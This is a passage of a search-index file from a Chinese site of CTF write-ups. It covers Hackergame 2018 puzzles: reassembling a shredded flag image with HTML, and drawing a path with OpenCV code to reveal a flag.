31 32 33 34 35 36 37 38 39 40 41 42 0110 0110 0110 1100 0110 0001 0110 0111 0111 1011 0011 0001 0011 0010 0011 0000 0011 0111 0011 0001 0011 0011 0011 1001 0011 0111 0010 1101 0011 0001 0011 1001 0110 0100 0011 0001 0010 1101 0011 0100 0011 1000 0110 0101 0011 0110 0010 1101 0110 0010 0110 0101 0011 1000 0110 0011 0010 1101 0011 0111 0011 1000 0011 0100 0110 0010 0011 1000 0011 1001 0110 0001 0011 1001 0011 0101 0110 0101 0011 0000 0011 0111 0111 1101 \u8f6c\u6362\u4e00\u4e0b\u5c31\u53ef\u4ee5\u4e86\uff1a 1 flag { 12071397 - 19 d1 - 48 e6 - be8c - 784 b89a95e07 } \u4e8b\u5b9e\u4e0a\u8fd9\u4e2a\u5e94\u8be5\u6dfb\u52a0\u4e00\u4e2aSPI\u7684Analyser\uff0c\u76f4\u63a5\u5c31\u53ef\u4ee5\u770b\u5230\u4e86\uff0c\u7136\u540e\u5bfc\u51fa\u5c31OK\u3002","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"ctf_writeup/ciscn_2019/usbasp/","text":"\u6709\u4e00\u5929AoiSystem\u663e\u793a\u6b63\u5728\u5347\u7ea7\u56fa\u4ef6\uff0c\u4f60\u600e\u4e48\u4f1a\u653e\u8fc7\u8fd9\u4e2a\u4e00\u952e\u66b4\u6253\u51fa\u9898\u4eba\u7684\u597d\u673a\u4f1a\u5462\uff1f \u8bf7\u4e0b\u8f7d\u9644\u4ef6(\u63d0\u53d6\u7801\uff1a96w8) \u5907\u7528\u4e0b\u8f7d","title":"Usbasp"},{"location":"ctf_writeup/hackergame_2018/card/","text":"\u6e38\u56ed\u4f1a\u7684\u96c6\u7ae0\u5361\u7247 \u9898\u76ee SOURCE: https://hack2018.lug.ustc.edu.cn/#card \u63d0\u793a\uff1aflag \u4ec5\u7531 0154agflPYHMGRCNE_{} \u8fd9\u4e9b\u5b57\u7b26\u7ec4\u6210\u3002 \u6211\u4eec\u7ecf\u5e38\u88ab\u95ee\u4e00\u4e2a\u95ee\u9898\uff1a\u4f60\u4eec\u662f\u4ece\u4ec0\u4e48\u65f6\u5019\u5f00\u59cb\u4e3a Hackergame \u51fa\u9898\u7684\uff1f \u5176\u5b9e\u6211\u4eec\u5168\u5e74\u90fd\u5728\u51fa\u9898\uff0c\u547d\u9898\u7ec4\u6210\u5458\u6765\u81ea\u5404\u79cd\u5404\u6837\u7684\u4e13\u4e1a\uff0c\u5728\u5404\u79cd\u5404\u6837\u7684\u5730\u65b9\uff0c\u6709\u5404\u79cd\u5404\u6837\u4e0d\u540c\u7684\u5de5\u4f5c\uff0c\u95f2\u6687\u4e4b\u4f59\uff08\u6216\u8005\u5de5\u4f5c\u4e0d\u9971\u548c\u7684\u65f6\u5019\uff0c\u8fd9\u4e2a\u6700\u597d\u5220\u6389\uff09\u6211\u4eec\u6700\u5927\u7684\u4e50\u8da3\u5c31\u662f\u4e92\u76f8\u51fa\u9898\u7ed9\u5bf9\u65b9\u73a9\u3002 \u4e3a\u4e86\u627e\u5230\u6709\u8da3\u7684\u9898\u76ee\uff0c\u6211\u4eec\u9700\u8981\u6e90\u6e90\u4e0d\u65ad\u7684\u7075\u611f\uff0c\u4e0d\u7ba1\u662f\u5728\u5df4\u8700\u4eba\u5bb6\u4e8c\u697c\u5305\u53a2 LUD\uff08 \u6ce8 1 \uff09 \u65f6\uff0c\u8fd8\u662f\u5728\u5317\u4eac\u98df\u5b9d\u8857\u7684\u5206\u7c73\u9e21\uff0c\u751a\u81f3\u662f\u5728\u6b66\u6c49\u5f00\u5f80\u5408\u80a5\u7684 D2256 \u5217\u8f66\u4e0a\uff0c\u6211\u4eec\u4f1a\u628a\u8ba8\u8bba\u5230\u7684\u6709\u8da3\u7684\u60f3\u6cd5\u8bb0\u5f55\u4e0b\u6765\uff0c\u4f5c\u4e3a\u4e0b\u4e00\u6b21 Hackergame \u7684\u9898\u76ee\u3002 \u6bd4\u5982\u524d\u51e0\u5929\uff0c\u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66\u5b66\u751f Linux \u7528\u6237\u534f\u4f1a\u5728\u4e2d\u533a\u6e38\u56ed\u4f1a\u6446\u644a\u62db\u65b0\uff08 \u6ce8 2 \uff09\uff0c\u53d1\u73b0\u5b66\u6821\u5c45\u7136\u4e3a\u6bcf\u4e2a\u53c2\u52a0\u6e38\u56ed\u4f1a\u7684\u540c\u5b66\u51c6\u5907\u4e86\u4e00\u5f20\u7cbe\u7f8e\u7684\u96c6\u7ae0\u5361\u7247\uff1a \u5230\u6bcf\u4e2a\u793e\u56e2\u7684\u644a\u4f4d\u4e0a\u6536\u96c6\u76d6\u7ae0\uff0c\u5230\u8fbe\u4e00\u5b9a\u6570\u91cf\u5c31\u6709\u793c\u54c1\u8d60\u9001\u3002 \u7a81\u7136\u4e00\u4f4d\u540c\u5b66\u7075\u673a\u4e00\u52a8\uff0c\u4e0d\u5982\u5199\u4e0a flag \u7136\u540e\u6495\u788e\uff01 \u9644\u4ef6\u5c31\u662f\u6495\u788e\u7684 flag\uff0c\u76f8\u4fe1\u5bf9\u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66\u6821\u5fbd\u4e86\u5982\u6307\u638c\u7684\u4f60\u5f88\u5feb\u5c31\u80fd\u5c06\u5b83\u8fd8\u539f\u3002 \u89e3\u51b3\u65b9\u6848 \u8fd9\u4e2a...\u53ef\u4ee5\u6709\u65e0\u6570\u79cd\u65b9\u6cd5\u628a\u56fe\u7247\u62fc\u597d\u3002\u6211\u7684\u9009\u62e9\u662fHTML\uff0c\u7531\u4e8eIDEA\u53ef\u4ee5\u63d0\u793a\u6587\u4ef6\u540d\uff0c\u6240\u4ee5\u8fd9\u6837\u505a\u76f8\u5f53\u5feb\u3002 \u5176\u5b9e\u4e0a\u9762\u8fd9\u4e2a\u56fe\u5c31\u662f\u62fc\u8d77\u6765\u7684\uff0c\u4e0d\u4fe1\u4f60\u53ef\u4ee5\u6309\u4e0bF12\u5ba1\u67e5\u4e00\u4e0b\u8fd9\u4e2a\u56fe\u662f\u4e0d\u662f25\u4e2aimg\u5143\u7d20\u3002\u4e0d\u8fc7...\u4f60\u53ef\u80fd\u4f1a\u53d1\u73b0\uff0c\u81ea\u5df1\u5199\u7684HTML\u91ccimg\u5143\u7d20\u5e76\u4e0d\u662f\u7d27\u5bc6\u6392\u5217\u7684\uff0c\u6216\u8005\u4f60\u53d1\u73b0\u4e0b\u9762\u7684\u4ee3\u7801\u91ccimg\u5143\u7d20\u4e4b\u95f4\u603b\u662f\u6709\u4e00\u4e2a\u5947\u602a\u7684\u6ce8\u91ca\u3002\u7531\u4e8einline-block\u95f4\u4f1a\u6709\u95f4\u8ddd\uff0c\u4e3a\u4ec0\u4e48\u4f1a\u6709\u548c\u600e\u4e48\u53bb\u9664\u7684\u95ee\u9898\uff0c\u4f60\u53ef\u4ee5\u5728\u7f51\u4e0a\u627e\u5230\u975e\u5e38\u591a\u7684\u76f8\u5173\u8d44\u6599\uff0c\u53bb\u9664\u5b83\u7684\u4e00\u4e2a\u6bd4\u8f83\u7c97\u66b4\u7684\u529e\u6cd5\u662f\u53bb\u6389img\u5143\u7d20\u4e4b\u95f4\u7684\u56de\u8f66\u548c\u7a7a\u683c\u7b49\u7a7a\u767d\u5b57\u7b26\uff0c\u4e3a\u4e86\u4e0d\u8ba9\u4e00\u884c\u770b\u4e0a\u53bb\u592a\u53ef\u6015\u4e8e\u662f\u6211\u628a\u5b83\u4eec\u5206\u5f00\u4e86\uff0c\u7136\u540e\u4e2d\u95f4\u6253\u4e0a\u6ce8\u91ca\u5c31\u597d\u4e86\uff0c\u4f60\u53ef\u4ee5\u5728\u4e0b\u9762\u770b\u5230\u3002\u81f3\u4e8e\u884c\u95f4\u7684\u7a7a\u767d\uff0c\u8fd9\u91cc\u56fe\u7247\u90fd\u662f125px\u7684\u9ad8\u5ea6\uff0c\u4e8e\u662f\u76f4\u63a5\u5bf9div\u5143\u7d20\u8bbe\u7f6e\u9ad8\u5ea6125px\u5c31\u53ef\u4ee5\u5566\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 <!DOCTYPE html> < html lang = \"en\" > < head > < meta charset = \"UTF-8\" > < title > card </ title > < style > div { height : 125 px ; } </ style > </ head > < body > < div > < img src = \"fragments/o71CmLXGTOMwC.png\" alt = \"11\" > <!-- --> < img src = \"fragments/bQ94Fx1mjP79C.png\" alt = \"12\" > <!-- --> < img src = \"fragments/gAf5weYdrA6UT.png\" alt = \"13\" > <!-- --> < img src = \"fragments/F6Hv0FJzoeScU.png\" alt = \"14\" > <!-- --> < img src = \"fragments/iBW71GAIUZWtN.png\" alt = \"15\" > </ div > < div > < img src = \"fragments/v2zMgTUijziLb.png\" alt = \"21\" > <!-- --> < img src = \"fragments/IGFavhnGQCxcN.png\" alt = \"22\" > <!-- --> < img src = \"fragments/qKqe06UDsBolc.png\" alt = \"23\" > <!-- --> < img src = \"fragments/FbyDcnN2nY7FV.png\" alt = \"24\" > <!-- --> < img src = \"fragments/06qjXv4T4ebcp.png\" alt = \"25\" > </ div > < div > < img src = \"fragments/ZFaDt5hcIq5PL.png\" alt = \"31\" > <!-- --> < img src = \"fragments/WAzaH5Tph7dsg.png\" alt = \"32\" > <!-- --> < img src = \"fragments/D9gPE3nJvpEXF.png\" alt = \"33\" > <!-- --> < img src = \"fragments/DZ1ujfw3qFAbk.png\" alt = \"34\" > <!-- --> < img src = \"fragments/tHclhSFyyORg4.png\" alt = \"35\" > </ div > < div > < img src = \"fragments/VfwN00osf0wTa.png\" alt = \"41\" > <!-- --> < img src = \"fragments/ZZWbAdGNDspdr.png\" alt = \"42\" > <!-- --> < img src = \"fragments/T0Kang6OWFdYC.png\" alt = \"43\" > <!-- --> < img src = \"fragments/Gd8zpdNfjxJZK.png\" alt = \"44\" > <!-- --> < img src = \"fragments/uPgc8rK5RlZ2s.png\" alt = \"45\" > </ div > < div > < img src = \"fragments/sOaGS0J08Mg0f.png\" alt = \"51\" > <!-- --> < img src = \"fragments/tU2Plsy7JetUr.png\" alt = \"52\" > <!-- --> < img src = \"fragments/9ooh29IcoQ4CC.png\" alt = \"53\" > <!-- --> < img src = \"fragments/d5NNCCjyDVU8X.png\" alt = \"54\" > <!-- --> < img src = \"fragments/pHO62EQBMSyeQ.png\" alt = \"55\" > </ div > </ body > </ html >","title":"\u6e38\u56ed\u4f1a\u7684\u96c6\u7ae0\u5361\u7247"},{"location":"ctf_writeup/hackergame_2018/card/#_1","text":"","title":"\u6e38\u56ed\u4f1a\u7684\u96c6\u7ae0\u5361\u7247"},{"location":"ctf_writeup/hackergame_2018/card/#_2","text":"SOURCE: https://hack2018.lug.ustc.edu.cn/#card \u63d0\u793a\uff1aflag \u4ec5\u7531 0154agflPYHMGRCNE_{} \u8fd9\u4e9b\u5b57\u7b26\u7ec4\u6210\u3002 \u6211\u4eec\u7ecf\u5e38\u88ab\u95ee\u4e00\u4e2a\u95ee\u9898\uff1a\u4f60\u4eec\u662f\u4ece\u4ec0\u4e48\u65f6\u5019\u5f00\u59cb\u4e3a Hackergame \u51fa\u9898\u7684\uff1f \u5176\u5b9e\u6211\u4eec\u5168\u5e74\u90fd\u5728\u51fa\u9898\uff0c\u547d\u9898\u7ec4\u6210\u5458\u6765\u81ea\u5404\u79cd\u5404\u6837\u7684\u4e13\u4e1a\uff0c\u5728\u5404\u79cd\u5404\u6837\u7684\u5730\u65b9\uff0c\u6709\u5404\u79cd\u5404\u6837\u4e0d\u540c\u7684\u5de5\u4f5c\uff0c\u95f2\u6687\u4e4b\u4f59\uff08\u6216\u8005\u5de5\u4f5c\u4e0d\u9971\u548c\u7684\u65f6\u5019\uff0c\u8fd9\u4e2a\u6700\u597d\u5220\u6389\uff09\u6211\u4eec\u6700\u5927\u7684\u4e50\u8da3\u5c31\u662f\u4e92\u76f8\u51fa\u9898\u7ed9\u5bf9\u65b9\u73a9\u3002 \u4e3a\u4e86\u627e\u5230\u6709\u8da3\u7684\u9898\u76ee\uff0c\u6211\u4eec\u9700\u8981\u6e90\u6e90\u4e0d\u65ad\u7684\u7075\u611f\uff0c\u4e0d\u7ba1\u662f\u5728\u5df4\u8700\u4eba\u5bb6\u4e8c\u697c\u5305\u53a2 LUD\uff08 \u6ce8 1 \uff09 \u65f6\uff0c\u8fd8\u662f\u5728\u5317\u4eac\u98df\u5b9d\u8857\u7684\u5206\u7c73\u9e21\uff0c\u751a\u81f3\u662f\u5728\u6b66\u6c49\u5f00\u5f80\u5408\u80a5\u7684 D2256 \u5217\u8f66\u4e0a\uff0c\u6211\u4eec\u4f1a\u628a\u8ba8\u8bba\u5230\u7684\u6709\u8da3\u7684\u60f3\u6cd5\u8bb0\u5f55\u4e0b\u6765\uff0c\u4f5c\u4e3a\u4e0b\u4e00\u6b21 Hackergame \u7684\u9898\u76ee\u3002 \u6bd4\u5982\u524d\u51e0\u5929\uff0c\u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66\u5b66\u751f Linux \u7528\u6237\u534f\u4f1a\u5728\u4e2d\u533a\u6e38\u56ed\u4f1a\u6446\u644a\u62db\u65b0\uff08 \u6ce8 2 \uff09\uff0c\u53d1\u73b0\u5b66\u6821\u5c45\u7136\u4e3a\u6bcf\u4e2a\u53c2\u52a0\u6e38\u56ed\u4f1a\u7684\u540c\u5b66\u51c6\u5907\u4e86\u4e00\u5f20\u7cbe\u7f8e\u7684\u96c6\u7ae0\u5361\u7247\uff1a \u5230\u6bcf\u4e2a\u793e\u56e2\u7684\u644a\u4f4d\u4e0a\u6536\u96c6\u76d6\u7ae0\uff0c\u5230\u8fbe\u4e00\u5b9a\u6570\u91cf\u5c31\u6709\u793c\u54c1\u8d60\u9001\u3002 \u7a81\u7136\u4e00\u4f4d\u540c\u5b66\u7075\u673a\u4e00\u52a8\uff0c\u4e0d\u5982\u5199\u4e0a flag \u7136\u540e\u6495\u788e\uff01 \u9644\u4ef6\u5c31\u662f\u6495\u788e\u7684 flag\uff0c\u76f8\u4fe1\u5bf9\u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66\u6821\u5fbd\u4e86\u5982\u6307\u638c\u7684\u4f60\u5f88\u5feb\u5c31\u80fd\u5c06\u5b83\u8fd8\u539f\u3002","title":"\u9898\u76ee"},{"location":"ctf_writeup/hackergame_2018/card/#_3","text":"\u8fd9\u4e2a...\u53ef\u4ee5\u6709\u65e0\u6570\u79cd\u65b9\u6cd5\u628a\u56fe\u7247\u62fc\u597d\u3002\u6211\u7684\u9009\u62e9\u662fHTML\uff0c\u7531\u4e8eIDEA\u53ef\u4ee5\u63d0\u793a\u6587\u4ef6\u540d\uff0c\u6240\u4ee5\u8fd9\u6837\u505a\u76f8\u5f53\u5feb\u3002 \u5176\u5b9e\u4e0a\u9762\u8fd9\u4e2a\u56fe\u5c31\u662f\u62fc\u8d77\u6765\u7684\uff0c\u4e0d\u4fe1\u4f60\u53ef\u4ee5\u6309\u4e0bF12\u5ba1\u67e5\u4e00\u4e0b\u8fd9\u4e2a\u56fe\u662f\u4e0d\u662f25\u4e2aimg\u5143\u7d20\u3002\u4e0d\u8fc7...\u4f60\u53ef\u80fd\u4f1a\u53d1\u73b0\uff0c\u81ea\u5df1\u5199\u7684HTML\u91ccimg\u5143\u7d20\u5e76\u4e0d\u662f\u7d27\u5bc6\u6392\u5217\u7684\uff0c\u6216\u8005\u4f60\u53d1\u73b0\u4e0b\u9762\u7684\u4ee3\u7801\u91ccimg\u5143\u7d20\u4e4b\u95f4\u603b\u662f\u6709\u4e00\u4e2a\u5947\u602a\u7684\u6ce8\u91ca\u3002\u7531\u4e8einline-block\u95f4\u4f1a\u6709\u95f4\u8ddd\uff0c\u4e3a\u4ec0\u4e48\u4f1a\u6709\u548c\u600e\u4e48\u53bb\u9664\u7684\u95ee\u9898\uff0c\u4f60\u53ef\u4ee5\u5728\u7f51\u4e0a\u627e\u5230\u975e\u5e38\u591a\u7684\u76f8\u5173\u8d44\u6599\uff0c\u53bb\u9664\u5b83\u7684\u4e00\u4e2a\u6bd4\u8f83\u7c97\u66b4\u7684\u529e\u6cd5\u662f\u53bb\u6389img\u5143\u7d20\u4e4b\u95f4\u7684\u56de\u8f66\u548c\u7a7a\u683c\u7b49\u7a7a\u767d\u5b57\u7b26\uff0c\u4e3a\u4e86\u4e0d\u8ba9\u4e00\u884c\u770b\u4e0a\u53bb\u592a\u53ef\u6015\u4e8e\u662f\u6211\u628a\u5b83\u4eec\u5206\u5f00\u4e86\uff0c\u7136\u540e\u4e2d\u95f4\u6253\u4e0a\u6ce8\u91ca\u5c31\u597d\u4e86\uff0c\u4f60\u53ef\u4ee5\u5728\u4e0b\u9762\u770b\u5230\u3002\u81f3\u4e8e\u884c\u95f4\u7684\u7a7a\u767d\uff0c\u8fd9\u91cc\u56fe\u7247\u90fd\u662f125px\u7684\u9ad8\u5ea6\uff0c\u4e8e\u662f\u76f4\u63a5\u5bf9div\u5143\u7d20\u8bbe\u7f6e\u9ad8\u5ea6125px\u5c31\u53ef\u4ee5\u5566\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 <!DOCTYPE html> < html lang = \"en\" > < head > < meta charset = \"UTF-8\" > < title > card </ title > < style > div { height : 125 px ; } </ style > </ head > < body > < div > < img src = \"fragments/o71CmLXGTOMwC.png\" alt = \"11\" > <!-- --> < img src = \"fragments/bQ94Fx1mjP79C.png\" alt = \"12\" > <!-- --> < img src = \"fragments/gAf5weYdrA6UT.png\" alt = \"13\" > <!-- --> < img src = \"fragments/F6Hv0FJzoeScU.png\" alt = \"14\" > <!-- --> < img src = \"fragments/iBW71GAIUZWtN.png\" alt = \"15\" > </ div > < div > < img src = \"fragments/v2zMgTUijziLb.png\" alt = \"21\" > <!-- --> < img src = \"fragments/IGFavhnGQCxcN.png\" alt = \"22\" > <!-- --> < img src = \"fragments/qKqe06UDsBolc.png\" alt = \"23\" > <!-- --> < img src = \"fragments/FbyDcnN2nY7FV.png\" alt = \"24\" > <!-- --> < img src = \"fragments/06qjXv4T4ebcp.png\" alt = \"25\" > </ div > < div > < img src = \"fragments/ZFaDt5hcIq5PL.png\" alt = \"31\" > <!-- --> < img src = \"fragments/WAzaH5Tph7dsg.png\" alt = \"32\" > <!-- --> < img src = \"fragments/D9gPE3nJvpEXF.png\" alt = \"33\" > <!-- --> < img src = \"fragments/DZ1ujfw3qFAbk.png\" alt = \"34\" > <!-- --> < img src = \"fragments/tHclhSFyyORg4.png\" alt = \"35\" > </ div > < div > < img src = \"fragments/VfwN00osf0wTa.png\" alt = \"41\" > <!-- --> < img src = \"fragments/ZZWbAdGNDspdr.png\" alt = \"42\" > <!-- --> < img src = \"fragments/T0Kang6OWFdYC.png\" alt = \"43\" > <!-- --> < img src = \"fragments/Gd8zpdNfjxJZK.png\" alt = \"44\" > <!-- --> < img src = \"fragments/uPgc8rK5RlZ2s.png\" alt = \"45\" > </ div > < div > < img src = \"fragments/sOaGS0J08Mg0f.png\" alt = \"51\" > <!-- --> < img src = \"fragments/tU2Plsy7JetUr.png\" alt = \"52\" > <!-- --> < img src = \"fragments/9ooh29IcoQ4CC.png\" alt = \"53\" > <!-- --> < img src = \"fragments/d5NNCCjyDVU8X.png\" alt = \"54\" > <!-- --> < img src = \"fragments/pHO62EQBMSyeQ.png\" alt = \"55\" > </ div > </ body > </ html >","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"ctf_writeup/hackergame_2018/cat_remote/","text":"\u732b\u54aa\u9065\u63a7\u5668 \u9898\u76ee SOURCE: https://hack2018.lug.ustc.edu.cn/#catremote \u63d0\u793a\uff1aflag \u683c\u5f0f\u4e3a flag{......}\uff0c\u53ea\u5305\u542b\u5b57\u6bcd\uff0c\u5176\u4e2d\u6709\u4e14\u53ea\u6709\u4e24\u4e2a\u4e3a\u5927\u5199\u5b57\u6bcd\u3002 \u4eca\u5929\u7684 App Store \u9996\u9875\u6545\u4e8b\u662f\u300a\u732b\u54aa\u5360\u9886\u4e16\u754c\u300b(\u8be6\u60c5)\u3002 SERIOUSLY? D \u540c\u5b66\u4e0d\u7981\u5f00\u59cb\u5e7b\u60f3\u88ab\u732b\u54aa\u5360\u9886\u7684\u4e16\u754c\uff1a\u96c6\u4e2d\u8425\u91cc\u6210\u7fa4\u7684\u94f2\u5c4e\u5b98\uff0c\u5bc6\u5bc6\u9ebb\u9ebb\u7684 Nepeta cataria\uff08Wikipedia\uff09\u519c\u7530\uff0c\u968f\u610f\u6446\u653e\u7684\u7eb8\u7bb1\u5b50\u5360\u6ee1\u4e86\u9053\u8def\u2026\u2026 \u60f3\u60f3\u5c31\u53ef\u6015\uff0c\u4e0d\u8fc7 D \u540c\u5b66\u77e5\u9053\u4eba\u7c7b\u8fd8\u6709\u7ec8\u6781\u79d8\u5bc6\u6b66\u5668\u53ef\u4ee5\u7528\u2014\u2014\u732b\u54aa\u9065\u63a7\u5668\uff0c\u6709\u4e86\u732b\u54aa\u9065\u63a7\u5668\uff0c\u518d\u591a\u7684\u732b\u54aa\u4e5f\u53ea\u4f1a\u4e56\u4e56\u5730\u542c\u4eba\u7c7b\u7684\u8bdd\uff0c\u54c8\u54c8\u54c8\u54c8\u54c8\uff5e \u4e0b\u9762\u662f\u5236\u4f5c\u732b\u54aa\u9065\u63a7\u5668\u7684\u6280\u672f\u603b\u7ed3\uff0c\u9700\u8981\u7684\u539f\u6599\u6709\uff1a 5mW 6mm \u70b9\u72b6\u6fc0\u5149\u4e8c\u6781\u7ba1\u4e00\u4e2a\uff1b \u9502\u7535\u6c60\u4e00\u4e2a\uff1b \u5bfc\u7ebf\u82e5\u5e72\uff1b \u7136\u540e\u7528\u5bfc\u7ebf\u5c06\u9502\u7535\u6c60\u548c\u6fc0\u5149\u4e8c\u6781\u7ba1\u8fde\u63a5\u8d77\u6765\uff08\u8fd9\u4e00\u6b65\u7684\u76ee\u7684\u662f\u8ba9\u4e8c\u6781\u7ba1\u4eae\u8d77\u6765\uff0c\u4e0d\u60f3\u4e8c\u6781\u7ba1\u4eae\u8d77\u6765\u7684\u540c\u5b66\u53ef\u4ee5\u4e0d\u8fde\uff09\uff0c\u4e00\u4e2a\u7f8e\u5473\u7684\u732b\u54aa\u9065\u63a7\u5668\u5c31\u505a\u597d\u4e86\u3002 \u732b\u54aa\u9065\u63a7\u5668\u7684\u539f\u7406\u975e\u5e38\u7b80\u5355\uff01\u64b8\u732b\u5b66\u4f1a\u66fe\u7ecf\u6709\u8bba\u6587\u7ed9\u51fa\u8fc7\u7ed3\u8bba\uff1a\u6fc0\u5149\u7b14\u6307\u5411\u54ea\u91cc\uff0c\u732b\u54aa\u5c31\u4f1a\u8dd1\u5230\u54ea\u91cc\u3002 \u4e3a\u4e86\u62a5\u590d\u732b\u54aa\u628a\u81ea\u5df1\u7684\u4ee3\u7801\u6253\u4e71\uff08\u89c1\uff1a\u732b\u54aa\u4e0e\u952e\u76d8\uff09\uff0cD \u540c\u5b66\u628a\u732b\u54aa\u9065\u63a7\u5668\u7ed1\u5728\u53ef\u4ee5\u4e0a\uff08UP\uff09\u4e0b\uff08DOWN\uff09\u5de6\uff08LEFT\uff09\u53f3\uff08RIGHT\uff09\u79fb\u52a8\u7684\u4e09\u8f74\u673a\u68b0\u81c2\u4e0a\uff0c\u5f00\u59cb\u4f7f\u7528\u6811\u8393\u6d3e\uff08\u4e00\u6b3e\u57fa\u4e8e Linux \u7684\u5355\u7247\u673a\u8ba1\u7b97\u673a\uff09\u63a7\u5236\u4e09\u8f74\u673a\u68b0\u81c2\uff0c\u8fdb\u800c\u63a7\u5236\u732b\u54aa\u5728\u8349\u5730\u4e0a\u8dd1\u6765\u8dd1\u53bb\u3002 \u9644\u4ef6\u662f\u6811\u8393\u6d3e\u4e0a\u7559\u4e0b\u7684\u8c03\u8bd5\u8f93\u51fa\u4fe1\u606f\uff0c\u6211\u4eec\u8d76\u5230\u73b0\u573a\u65f6\u53ea\u5269\u4e0b\u8fd9\u4e2a\u4e86\u3002 \u89e3\u51b3\u65b9\u6848 \u6253\u5f00\u6587\u6863\u53d1\u73b0\u4e3a\u56db\u4e2a\u65b9\u5411\u7684\u5b57\u6bcd\uff0c\u731c\u60f3\u753b\u51fa\u8be5\u8def\u7ebf\u5373\u53ef\u83b7\u5f97flag\u3002\u5f88\u591a\u5de5\u5177\u53ef\u4ee5\u5b9e\u73b0\u8fd9\u4e00\u529f\u80fd\uff0c\u8fd9\u91cc\u4f7f\u7528OpenCV\u8f85\u52a9\u753b\u56fe\uff0c\u4f5c\u56fe\u540e\u5373\u53ef\u53d1\u73b0flag\u3002 \u5176\u4e2d\uff0c\u53d8\u91cfmap\u6784\u9020\u51fd\u6570\u53c2\u6570\u662f\u753b\u5e03\u7684\u5927\u5c0f\u7b49\u5c5e\u6027\uff0c\u53d8\u91cfrow\u548ccol\u662f\u8d77\u59cb\u7684\u4f4d\u7f6e\u5750\u6807\u3002\u5176\u6b21\uff0cswitch\u8bed\u53e5\u4e2d\u7684\u53cc\u5c42\u5faa\u73af\u662f\u4e3a\u4e86\u8ba9\u7ebf\u6761\u66f4\u7c97\u4e00\u4e9b\uff0c\u5ef6\u65f6\u5219\u662f\u4e3a\u4e86\u5c55\u793a\u52a8\u753b\u6548\u679c\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 #include <iostream> #include <fstream> #include <opencv2/opencv.hpp> int main () { cv :: Mat map ( 256 , 768 , CV_8UC1 ); std :: ifstream inputFileStream ( \"seq.txt\" ); int row = 50 , col = 128 ; map . at < uchar > ( row , col ) = 255 ; std :: string line ; inputFileStream >> line ; for ( auto i : line ) { switch ( i ) { case 'U' : row -= 1 ; for ( int ir = - 1 ; ir < 1 ; ++ ir ) { for ( int ic = - 1 ; ic < 1 ; ++ ic ) { map . at < uchar > ( row + ir , col + ic ) = 255 ; } } break ; case 'D' : row += 1 ; for ( int ir = - 1 ; ir < 1 ; ++ ir ) { for ( int ic = - 1 ; ic < 1 ; ++ ic ) { map . at < uchar > ( row + ir , col + ic ) = 255 ; } } break ; case 'L' : col -= 1 ; for ( int ir = - 1 ; ir < 1 ; ++ ir ) { for ( int ic = - 1 ; ic < 1 ; ++ ic ) { map . at < uchar > ( row + ir , col + ic ) = 255 ; } } break ; case 'R' : col += 1 ; for ( int ir = - 1 ; ir < 1 ; ++ ir ) { for ( int ic = - 1 ; ic < 1 ; ++ ic ) { map . at < uchar > ( row + ir , col + ic ) = 255 ; } } break ; default : ; } cv :: waitKey ( 1 ); cv :: imshow ( \"MAP\" , map ); } cv :: imshow ( \"MAP\" , map ); cv :: waitKey ( 0 ); return 0 ; }","title":"\u732b\u54aa\u9065\u63a7\u5668"},{"location":"ctf_writeup/hackergame_2018/cat_remote/#_1","text":"","title":"\u732b\u54aa\u9065\u63a7\u5668"},{"location":"ctf_writeup/hackergame_2018/cat_remote/#_2","text":"SOURCE: https://hack2018.lug.ustc.edu.cn/#catremote \u63d0\u793a\uff1aflag \u683c\u5f0f\u4e3a flag{......}\uff0c\u53ea\u5305\u542b\u5b57\u6bcd\uff0c\u5176\u4e2d\u6709\u4e14\u53ea\u6709\u4e24\u4e2a\u4e3a\u5927\u5199\u5b57\u6bcd\u3002 \u4eca\u5929\u7684 App Store \u9996\u9875\u6545\u4e8b\u662f\u300a\u732b\u54aa\u5360\u9886\u4e16\u754c\u300b(\u8be6\u60c5)\u3002 SERIOUSLY? D \u540c\u5b66\u4e0d\u7981\u5f00\u59cb\u5e7b\u60f3\u88ab\u732b\u54aa\u5360\u9886\u7684\u4e16\u754c\uff1a\u96c6\u4e2d\u8425\u91cc\u6210\u7fa4\u7684\u94f2\u5c4e\u5b98\uff0c\u5bc6\u5bc6\u9ebb\u9ebb\u7684 Nepeta cataria\uff08Wikipedia\uff09\u519c\u7530\uff0c\u968f\u610f\u6446\u653e\u7684\u7eb8\u7bb1\u5b50\u5360\u6ee1\u4e86\u9053\u8def\u2026\u2026 \u60f3\u60f3\u5c31\u53ef\u6015\uff0c\u4e0d\u8fc7 D \u540c\u5b66\u77e5\u9053\u4eba\u7c7b\u8fd8\u6709\u7ec8\u6781\u79d8\u5bc6\u6b66\u5668\u53ef\u4ee5\u7528\u2014\u2014\u732b\u54aa\u9065\u63a7\u5668\uff0c\u6709\u4e86\u732b\u54aa\u9065\u63a7\u5668\uff0c\u518d\u591a\u7684\u732b\u54aa\u4e5f\u53ea\u4f1a\u4e56\u4e56\u5730\u542c\u4eba\u7c7b\u7684\u8bdd\uff0c\u54c8\u54c8\u54c8\u54c8\u54c8\uff5e \u4e0b\u9762\u662f\u5236\u4f5c\u732b\u54aa\u9065\u63a7\u5668\u7684\u6280\u672f\u603b\u7ed3\uff0c\u9700\u8981\u7684\u539f\u6599\u6709\uff1a 5mW 6mm \u70b9\u72b6\u6fc0\u5149\u4e8c\u6781\u7ba1\u4e00\u4e2a\uff1b \u9502\u7535\u6c60\u4e00\u4e2a\uff1b \u5bfc\u7ebf\u82e5\u5e72\uff1b 